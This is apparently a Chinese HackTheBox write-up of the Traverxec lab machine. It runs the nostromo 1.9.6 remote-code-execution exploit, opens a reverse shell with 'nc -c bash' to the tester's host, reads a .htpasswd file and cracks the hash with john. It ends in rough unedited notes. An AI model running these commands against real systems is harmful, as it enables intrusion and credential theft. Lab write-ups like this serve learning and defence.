# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务发现
```
┌──(root💀kali)-[~/htb/Traverxec]
└─# nmap -sV -Pn 10.10.10.165              
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-27 10:01 EST
Nmap scan report for 10.10.10.165
Host is up (0.63s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.28 seconds

```

看到网络服务器是nostromo，搜索这个服务器的漏洞情况
```
┌──(root💀kali)-[~/htb/Traverxec]
└─# searchsploit nostromo 1.9.6                                                                                                                                                                                                                        130 ⨯
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
nostromo 1.9.6 - Remote Code Execution                                                                                                                                                                                     | multiple/remote/47837.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

存在一个RCE

尝试执行：
```
┌──(root💀kali)-[~/htb/Traverxec]
└─# python 47837.py 10.10.10.165 80 id                                                                                       


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    




HTTP/1.1 200 OK
Date: Mon, 27 Dec 2021 15:20:04 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

成功执行```id```命令，证实rce存在

我们执行以下payload

> python 47837.py 10.10.10.165 80 'nc -c bash 10.10.14.3 4242'


成功拿到立足点：
```
┌──(root💀kali)-[~/htb/Traverxec]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.165] 46046
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


在 ```/var/nostromo/conf/.htpasswd```找到一个用户凭证
```
www-data@traverxec:/tmp$ cat /var/nostromo/conf/.htpasswd
cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

```

保存到本地用john破解
```
hn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:01:04 DONE (2021-12-27 11:11) 0.01548g/s 163775p/s 163775c/s 163775C/s Noyoudo..Novaem
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

可是用这个密码不能切换到david，也不能ssh登录。



passwd file: /etc/pam.d/passwd                                                                                                                                       
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd
passwd file: /var/nostromo/conf/.htpasswd


The password hash is from the {SSHA} to 'structural'                                                                                                                 
drwxr-xr-x 2 root root 4096 Oct 25  2019 /etc/ldap

ssh -v david@10.10.10.165 id

htpasswd /var/nostromo/conf/.htpasswd david